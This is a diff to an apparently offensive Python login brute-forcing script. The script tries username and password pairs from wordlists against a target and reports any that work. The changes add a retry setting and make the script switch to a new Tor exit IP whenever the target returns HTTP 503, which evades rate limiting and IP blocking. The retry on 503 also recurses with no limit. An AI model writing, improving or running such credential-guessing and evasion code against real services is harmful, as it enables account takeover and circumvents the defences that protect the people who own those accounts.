@@ -23,6 +23,7 @@ def get_args():
 	parser.add_argument('-P', '--password_list', required=False, default=None, action='store', help='Password list')
 	parser.add_argument('-UP', '--userpassword_list', required=False, default=None, action='store', help='List with format user:password')
 	parser.add_argument('-d', '--debug', required=False, default=True, action='store', help='Debug mode. Default: False')
+	parser.add_argument('-r', '--retries', required=False, default=3, action='store', help='Retries per IP address. Default: 3')
 	return parser
 
 
@@ -48,7 +49,7 @@ def get_controller(tor_password):
 		pass
 
 
-def check_creds(target,credential,debug,counter,pairs):
+def check_creds(target,credential,debug,counter,pairs,controller,tor_password):
 	user = credential[0]
 	password = credential[1]
 	headers = {
@@ -71,8 +72,15 @@ def check_creds(target,credential,debug,counter,pairs):
 		print("[!!!] Correct password: %s: %s"%(user,password))
 		sys.exit(0)
 	else:
-		if debug: print("[%s/%s] Incorrect password"%(str(counter), str(len(pairs))))
-	
+		if debug: print("[%s/%s] Incorrect password"%(str(counter), str(pairs)))
+
+	if str(response.status_code) == "503" and tor_password is not None:
+		if debug: print("[%s/%s] Changing IP address"%(str(counter), str(pairs)))
+		new_ip = change_tor_ip(controller, debug)
+		if debug: print("[%s/%s] New IP address: %s"%(str(counter), str(pairs), new_ip))
+		check_creds(target, credential, debug, counter, pairs, controller, tor_password)
+
+
 
 def main():
 	# Get arguments
@@ -89,7 +97,7 @@ def main():
 	if (args.password_list is not None and not os.path.isfile(args.password_list)):
 		print ("[!] Error: Use '-UP' with a file of usernames and passwords with the format username:password")
 		sys.exit(0)
-	
+
 	# Create variables
 	if args.userpassword_list is None:
 		users =      [args.user] if args.user is not None else open(args.user_list).read().splitlines()
@@ -100,14 +108,16 @@ def main():
 		users =      [c.split(":")[0] for c in creds]
 		passwords =  [c.split(":")[1] for c in creds]
 		pairs =      [(c.split(":")[0],c.split(":")[1]) for c in creds]
-	
+
 	tor_password = args.tor_password if args.tor_password is not None else None
 	debug =      json.loads(args.debug.lower()) if isinstance(args.debug,str) else args.debug
 	target = args.target
+	retries = int(args.retries)
 	counter = 0
 	correct_users_list = []
+	controller = None
 
-	if tor_password is not None:	
+	if tor_password is not None:
 		controller = get_controller(tor_password)
 		new_ip = change_tor_ip(controller, debug)
 	for credential in pairs:
@@ -115,8 +125,8 @@ def main():
 			counter += 1
 			print("[%s/%s] Testing %s:%s"%(str(counter), str(len(pairs)),credential[0], credential[1]))
 			try:
-				check_creds(target,credential,debug,str(counter), str(len(pairs)))
-				if tor_password is not None:
+				check_creds(target,credential,debug,str(counter), str(len(pairs)),controller,tor_password)
+				if (tor_password is not None) and (counter%retries == 0):
 					if debug: print("[%s/%s] Changing IP address"%(str(counter), str(len(pairs))))
 					new_ip = change_tor_ip(controller, debug)
 					if debug: print("[%s/%s] New IP address: %s"%(str(counter), str(len(pairs)), new_ip))
